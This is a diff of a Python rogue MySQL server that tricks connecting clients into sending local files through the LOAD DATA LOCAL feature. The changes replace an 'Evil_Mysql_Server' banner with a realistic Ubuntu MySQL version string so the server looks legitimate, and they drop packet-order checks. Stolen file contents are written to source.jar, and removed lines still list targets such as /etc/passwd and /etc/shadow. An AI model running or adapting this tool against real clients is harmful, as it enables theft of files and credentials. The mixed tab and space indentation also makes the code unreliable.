@@ -1,4 +1,3 @@
-#!/usr/bin/env python
 #coding: utf8
 
 
@@ -13,10 +12,11 @@ import logging.handlers
 
 
 PORT = 3306
+readFileName = "source.jar"
 
 log = logging.getLogger(__name__)
 
-log.setLevel(logging.DEBUG)
+log.setLevel(logging.INFO)
 tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
 tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
 log.addHandler(
@@ -24,13 +24,10 @@ log.addHandler(
 )
 
 filelist = (
-#    r'c:\boot.ini',
-    r'c:\windows\win.ini',
-#    r'c:\windows\system32\drivers\etc\hosts',
-#    '/etc/passwd',
-#    '/etc/shadow',
+     '/path/to/file',
 )
 
+f = open(readFileName, "wb")
 
 #================================================
 #=======No need to change after this lines=======
@@ -114,17 +111,9 @@ class http_request_handler(asynchat.async_chat):
                 0,
                 "".join((
                     '\x0a',  # Protocol
-                    '3.0.0-Evil_Mysql_Server' + '\0',  # Version
-                    #'5.1.66-0+squeeze1' + '\0',
-                    '\x36\x00\x00\x00',  # Thread ID
-                    'evilsalt' + '\0',  # Salt
-                    '\xdf\xf7',  # Capabilities
-                    '\x08',  # Collation
-                    '\x02\x00',  # Server Status
-                    '\0' * 13,  # Unknown
-                    'evil2222' + '\0',
-                ))
-            )
+                    '5.6.28-0ubuntu0.14.04.1' + '\0',
+                    '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
+                ))            )
         )
 
         self.order = 1
@@ -159,11 +148,13 @@ class http_request_handler(asynchat.async_chat):
         elif self.state == 'Data':
             packet = mysql_packet.parse(data)
             try:
-                if self.order != packet.packet_num:
-                    raise OutOfOrder()
-                else:
-                    # Fix ?
-                    self.order = packet.packet_num + 2
+            	print("Debug the package number-------")
+            	print(packet.packet_num)
+                # if self.order != packet.packet_num:
+                #     raise OutOfOrder()
+                # else:
+                #     # Fix ?
+                #     self.order = packet.packet_num + 2
                 if packet.packet_num == 0:
                     if packet.payload[0] == '\x03':
                         log.info('Query')
@@ -192,31 +183,34 @@ class http_request_handler(asynchat.async_chat):
                     elif packet.payload == '\x00\x01':
                         self.push(None)
                         self.close_when_done()
-                    else:
-                        raise ValueError()
-                else:
-                    if self.sub_state == 'File':
-                        log.info('-- result')
-                        log.info('Result: %r', data)
+                    # else:
+                    #     raise ValueError()
+                # else:
+                if self.sub_state == 'File':
+                    log.info('-- result')
+                    log.info('Result: %r', data)
+                    if str(data).find("@@character_set_connection") == -1:
+                        f.write(data[1:])
+                        f.flush()
 
-                        if len(data) == 1:
-                            self.push(
-                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
-                            )
-                            raise LastPacket()
-                        else:
-                            self.set_terminator(3)
-                            self.state = 'LEN'
-                            self.order = packet.packet_num + 1
-
-                    elif self.sub_state == 'Auth':
-                        self.push(mysql_packet(
-                            packet, '\0\0\0\x02\0\0\0'
-                        ))
+                    if len(data) == 1:
+                        self.push(
+                            mysql_packet(packet, '\0\0\0\x02\0\0\0')
+                        )
                         raise LastPacket()
                     else:
-                        log.info('-- else')
-                        raise ValueError('Unknown packet')
+                        self.set_terminator(3)
+                        self.state = 'LEN'
+                        self.order = packet.packet_num + 1
+
+                elif self.sub_state == 'Auth':
+                    self.push(mysql_packet(
+                        packet, '\0\0\0\x02\0\0\0'
+                    ))
+                    raise LastPacket()
+                else:
+                    log.info('-- else')
+                    raise ValueError('Unknown packet')
             except LastPacket:
                 log.info('Last packet')
                 self.state = 'LEN'
@@ -243,18 +237,17 @@ class mysql_listener(asyncore.dispatcher):
             try:
                 self.bind(('', PORT))
             except socket.error:
+            	print("Error happend")
                 exit()
 
             self.listen(5)
 
     def handle_accept(self):
         pair = self.accept()
-
         if pair is not None:
-            log.info('Conn from: %r', pair[1])
             tmp = http_request_handler(pair)
 
 
 z = mysql_listener()
-daemonize()
+# daemonize()
 asyncore.loop()
